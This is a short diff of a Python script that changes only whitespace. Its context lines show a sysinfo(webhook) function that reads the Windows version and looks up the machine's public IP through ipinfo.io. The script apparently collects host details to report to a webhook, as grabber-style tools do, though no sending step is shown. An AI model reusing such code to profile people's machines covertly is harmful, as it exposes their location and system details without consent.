@@ -20,7 +20,7 @@ from tkinter import messagebox
 from conf import *
 
 def sysinfo(webhook):
-    ver = platform.version().split('.')[2]
+    ver = platform.version().split('.')[2] 
     plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'
     ip = requests.get('https://ipinfo.io/json')
     iplog = ip.json()
@@ -407,4 +407,5 @@ def main():
         
 
 main()
+
 
